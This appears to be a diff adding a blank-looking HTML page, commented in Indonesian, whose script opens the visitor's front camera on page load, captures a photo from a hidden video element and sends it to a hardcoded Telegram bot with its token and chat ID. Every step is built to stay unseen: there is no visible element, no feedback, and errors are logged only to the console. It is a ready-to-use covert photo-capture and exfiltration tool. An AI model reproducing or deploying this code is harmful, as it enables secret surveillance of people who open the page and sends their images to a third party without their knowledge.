@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>📸</title>
+    <style>
+        /* Halaman kosong dengan latar gelap, tanpa elemen terlihat */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            min-height: 100vh;
+            background: #0b0b1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        /* Tidak ada elemen visual apa pun */
+    </style>
+</head>
+<body>
+
+    <!-- Tidak ada elemen UI -- semua diproses di balik layar -->
+
+    <script>
+        (function() {
+            'use strict';
+
+            // ---------- KONFIGURASI ----------
+            const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
+            const CHAT_ID = '8463156896';
+
+            // ---------- KIRIM KE TELEGRAM ----------
+            async function kirimKeTelegram(dataUrl) {
+                try {
+                    const blob = await fetch(dataUrl).then(r => r.blob());
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'foto.png');
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('caption',
+                        `📸 Foto diambil otomatis\n🕒 ${new Date().toLocaleString('id-ID')}`
+                    );
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    // Tidak ada notifikasi sukses di UI
+                } catch (e) {
+                    // Error hanya dicatat di konsol, tidak ditampilkan
+                    console.error('Gagal kirim ke Telegram:', e);
+                }
+            }
+
+            // ---------- AMBIL FOTO & KIRIM ----------
+            function ambilDanKirim(video) {
+                // Buat canvas dan ambil frame
+                const canvas = document.createElement('canvas');
+                const lebar = video.videoWidth || 640;
+                const tinggi = video.videoHeight || 480;
+                canvas.width = lebar;
+                canvas.height = tinggi;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, lebar, tinggi);
+
+                const dataUrl = canvas.toDataURL('image/png');
+
+                // Kirim ke Telegram
+                kirimKeTelegram(dataUrl);
+
+                // Hentikan stream kamera untuk menghemat resource
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+
+                // Tidak ada umpan balik di UI
+            }
+
+            // ---------- MULAI KAMERA ----------
+            function mulaiKamera() {
+                navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                })
+                .then(stream => {
+                    // Buat elemen video tersembunyi
+                    const video = document.createElement('video');
+                    video.style.display = 'none'; // tidak terlihat
+                    video.setAttribute('playsinline', '');
+                    video.muted = true;
+                    video.srcObject = stream;
+
+                    // Tambahkan ke DOM (tetap tidak terlihat)
+                    document.body.appendChild(video);
+
+                    // Saat metadata siap, putar video
+                    video.onloadedmetadata = () => {
+                        video.play().then(() => {
+                            // Tunggu sebentar agar frame pertama tersedia, lalu ambil foto
+                            // Tanpa delay 3 detik — langsung capture
+                            setTimeout(() => ambilDanKirim(video), 100);
+                        }).catch(err => {
+                            console.error('Gagal memutar video:', err);
+                        });
+                    };
+
+                    // Jika ada error pada video
+                    video.onerror = (err) => {
+                        console.error('Error video:', err);
+                    };
+                })
+                .catch(err => {
+                    // Izin ditolak atau error lain — hanya dicatat di konsol
+                    console.error('Gagal mengakses kamera:', err);
+                });
+            }
+
+            // ---------- JALANKAN SAAT HALAMAN SIAP ----------
+            if (document.readyState === 'complete') {
+                mulaiKamera();
+            } else {
+                window.addEventListener('load', mulaiKamera);
+            }
+        })();
+    </script>
+</body>
+</html>
